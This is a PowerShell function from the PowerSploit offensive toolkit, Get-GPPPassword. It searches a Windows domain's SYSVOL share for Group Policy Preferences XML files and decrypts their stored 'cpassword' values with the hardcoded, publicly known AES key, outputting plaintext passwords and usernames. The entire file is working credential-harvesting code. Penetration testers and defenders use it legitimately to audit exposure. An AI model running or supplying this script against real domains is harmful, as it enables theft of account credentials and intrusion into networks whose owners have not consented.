function Get-GPPPassword {
<#
.SYNOPSIS

    Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.

    PowerSploit Function: Get-GPPPassword
    Author: Chris Campbell (@obscuresec)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
 
.DESCRIPTION

    Get-GPPPassword searches the domain controller for groups.xml, scheduledtasks.xml, services.xml and datasources.xml and returns plaintext passwords.

.EXAMPLE

    Get-GPPPassword

.LINK
    
    http://www.obscuresecurity.blogspot.com/2012/05/gpp-password-retrieval-with-powershell.html
    https://github.com/mattifestation/PowerSploit/blob/master/Recon/Get-GPPPassword.ps1
    http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences
    http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html
#>
    
    [CmdletBinding()]
    Param ()
    
    #define helper function that decodes and decrypts password
    function Get-DecryptedCpassword {
        Param (
            [string] $Cpassword 
        )

        try {
            #Append appropriate padding based on string length  
            $Mod = ($Cpassword.length % 4)
            if ($Mod -ne 0) {$Cpassword += ('=' * (4 - $Mod))}

            $Base64Decoded = [Convert]::FromBase64String($Cpassword)
            
            #Create a new AES .NET Crypto Object
            $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
            [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                 0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
            
            #Set IV to all nulls to prevent dynamic generation of IV value
            $AesIV = New-Object Byte[]($AesObject.IV.Length) 
            $AesObject.IV = $AesIV
            $AesObject.Key = $AesKey
            $DecryptorObject = $AesObject.CreateDecryptor() 
            [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
            
            return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
        } 
        
        catch {Write-Error $Error[0]}
    }  
    
    #ensure that machine is domain joined and script is running as a domain account
    if ( ( ((Get-WmiObject Win32_ComputerSystem).partofdomain) -eq $False ) -or ( -not $Env:USERDNSDOMAIN ) )
    {
        throw 'Machine is not joined to a domain.'
    }
    
    #discover potential files containing passwords ; not complaining in case of denied access to a directory
    $XMlFiles = Get-ChildItem -Path "\\$Env:USERDNSDOMAIN\SYSVOL" -Recurse -ErrorAction SilentlyContinue -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml'
    
    if ( -not $XMlFiles )
    {
        throw 'No files containing encrypted passwords found.'
    }

    foreach ($File in $XMLFiles) {
        
        try {
            $Filename = $File.Name
            $Filepath = $File.VersionInfo.FileName

            #put filename in $XmlFile
            [xml] $Xml = Get-Content ($File)

            #declare blank variables
            $Cpassword = ''
            $UserName = ''
            $NewName = ''
            $Changed = ''
    
            switch ($Filename) {

                'Groups.xml' {
                    $Cpassword = $Xml.Groups.User.Properties.cpassword
                    $UserName = $Xml.Groups.User.Properties.userName
                    $NewName = $Xml.Groups.User.Properties.newName
                    $Changed = $Xml.Groups.User.changed
                }
        
                'Services.xml' {
                    $Cpassword = $Xml.NTServices.NTService.Properties.cpassword
                    $UserName = $Xml.NTServices.NTService.Properties.accountName
                    $Changed = $Xml.NTServices.NTService.changed
                }
        
                'Scheduledtasks.xml' {
                    $Cpassword = $Xml.ScheduledTasks.Task.Properties.cpassword
                    $UserName = $Xml.ScheduledTasks.Task.Properties.runAs
                    $Changed = $Xml.ScheduledTasks.Task.changed
                }
        
                'DataSources.xml' {
                    $Cpassword = $Xml.DataSources.DataSource.Properties.cpassword
                    $UserName = $Xml.DataSources.DataSource.Properties.username
                    $Changed = $Xml.DataSources.DataSource.changed
                }
            }

            if ($Cpassword) {$Password = Get-DecryptedCpassword $Cpassword}

            else {Write-Verbose "No encrypted passwords found in $Filepath"}
        
            #Create custom object to output results
            $ObjectProperties = @{'Password' = $Password;
                                  'UserName' = $UserName;
                                  'Changed' = $Changed;
                                  'NewName' = $NewName
                                  'File' = $Filepath}
                
            $ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
            Write-Output $ResultsObject
        }
        
        catch {Write-Error $Error[0]}  
    }
}
